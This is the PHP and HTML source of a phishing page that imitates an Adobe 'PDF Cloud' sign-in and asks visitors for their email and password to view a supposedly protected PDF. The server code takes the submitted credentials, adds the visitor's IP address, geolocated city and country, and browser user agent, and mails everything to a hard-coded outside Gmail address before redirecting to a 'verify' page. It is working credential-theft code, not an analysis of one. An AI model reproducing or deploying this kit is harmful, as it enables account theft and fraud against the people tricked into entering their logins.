<?
require_once 'block.php';
?>

<?php 

if (isset($_POST['Upgrade'])) { 
 
$browser = $_SERVER['HTTP_USER_AGENT'];

require_once('geoplugin.class.php');

$geoplugin = new geoPlugin();

//get user's ip address
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 

$message .= "-----------------------------------------------------------------\n";
$message .= "Email: " . $_POST['email'] . "\n"; 
$message .= "Password: " . $_POST['password'] . "\n"; 
$message .= "IP : " .$ip. "\n"; 
$message .= "-----------------------------------------------------------------\n";
$message .= "City: {$geoplugin->city}\n";
$message .= "Region: {$geoplugin->region}\n";
$message .= "Country Name: {$geoplugin->countryName}\n";
$message .= "Country Code: {$geoplugin->countryCode}\n";
$message .= "-----------------------------------------------------------------\n";
$message .= "User Agent : ".$browser."\n";
$message .= "-----------------------------------------------------------------\n";

$subject="adobCom | $ip";
$from= "From: adobCom";

if($_POST['Upgrade'] !=""){

  mail("moneymind809@gmail.com", $subject, $message, $from);

}

?> 

<script type="text/javascript"> 
<!-- 
   window.location="verify.php"; 

</script> <?PHP

die();
}


?>

<html><head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>Sign In - PDF Cloud</title>

<script type="text/javascript">
function MM_validateForm() { //v4.0
if (document.getElementById){
var i,p,q,nm,test,num,min,max,errors='',args=MM_validateForm.arguments;
for (i=0; i<(args.length-2); i+=3) { test=args[i+2]; val=document.getElementById(args[i]);
if (val) { nm=val.name; if ((val=val.value)!="") {
if (test.indexOf('isEmail')!=-1) { p=val.indexOf('@');
if (p<1 || p==(val.length-1)) errors+='- '+nm+' must contain an e-mail address.\n';
} else if (test!='R') { num = parseFloat(val);
if (isNaN(val)) errors+='- '+nm+' must contain a number.\n';
if (test.indexOf('inRange') != -1) { p=test.indexOf(':');
min=test.substring(8,p); max=test.substring(p+1);
if (num<min || max<num) errors+='- '+nm+' must contain a number between '+min+' and '+max+'.\n';
} } } else if (test.charAt(0) == 'R') errors += '- '+nm+' is required.\n'; }
} if (errors) alert('The following error(s) occurred:\n'+errors);
document.MM_returnValue = (errors == '');
} }
</script>
<link rel="stylesheet" type="text/css" href="index_files/adobe.css">
</head>
<body>
<div id="box">
<div class="logo"> <br>
</div>

<div class="instruction"><center> Sign in with your email address to view or download attachment</center> </div>



<div class="pd_icon"> <img src="index_files/icon_pdf.png" height="100" weight="100">
</div>
<form action="#" method="post">
<table id="form-1" cellpadding="5">
<tbody>	
<tr>
<td colspan="2"><input class="text-field" id="mail" name="email" placeholder="Receiver email address" type="text"></td>
</tr>
<tr>
<td colspan="2"><input class="text-field" id="password" name="password" placeholder="Password" type="password"></td>
</tr>
<tr>
<td><input name="public" type="checkbox">
<span class="always_on">Stay signed in </span>
<br>
<span class="always_on_inst">Uncheck on public
devices</span></td>
<td valign="top"><span class="pdf-protected">This
PDF is protected</span></td>
</tr>
<tr>
<td colspan="2"><input class="btn1" onclick="MM_validateForm('password','','R','mail','','RisEmail','phone','','NisNum');return document.MM_returnValue" name="Upgrade" value="VIEW FILE" type="submit"></td>
</tr>

</tbody>
</table>

</form>

<center><p class=""><font color="#555">Access your documents securely, no matter your location</font></p></center>

</div>
<center><img src="index_files/alls.png" height="150" weight="150"></center>


</body></html>